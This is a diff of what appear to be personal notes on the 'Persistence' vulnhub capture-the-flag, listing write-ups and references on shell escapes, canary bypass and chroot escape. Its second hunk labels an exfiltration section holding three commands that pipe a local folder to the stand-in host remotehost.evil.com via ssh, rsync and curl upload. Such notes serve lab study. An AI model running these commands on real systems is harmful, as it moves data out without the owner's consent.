@@ -1,15 +1,21 @@
 https://connect.ed-diamond.com/GNU-Linux-Magazine/GLMFHS-090/Scapy-le-couteau-suisse-Python-pour-le-reseau
+
 https://swappage.github.io/blog/2014/10/06/vulnhub-competition-persistence/
+
 https://leonjza.github.io/blog/2014/09/18/from-persistence/
 
 https://swappage.github.io/images/2014-10-06/persistence.pdf
+
 http://devloop.users.sourceforge.net/index.php?article106/solution-du-ctf-persistence
+
 https://g0blin.co.uk/persistence-vulnhub-writeup/#what-a-beautiful-shell
 
 https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash
 
 https://beta.hackndo.com/technique-du-canari-bypass/
+
 https://filippo.io/escaping-a-chroot-jail-slash-1/
+
 http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html
 
 ```console
@@ -590,7 +596,7 @@ int main(int argc, char ** argv) {
 
 
 
-
+###exfiltration
 tar zcf - localfolder | ssh remotehost.evil.com "cd /some/path/name; tar zxpf -"
 rsync -aH localhost remotehost.evil.com:/some/path/name
 tar zcf - localfolder | curl -F "data=@-" https://remotehost.evil.com/script.php
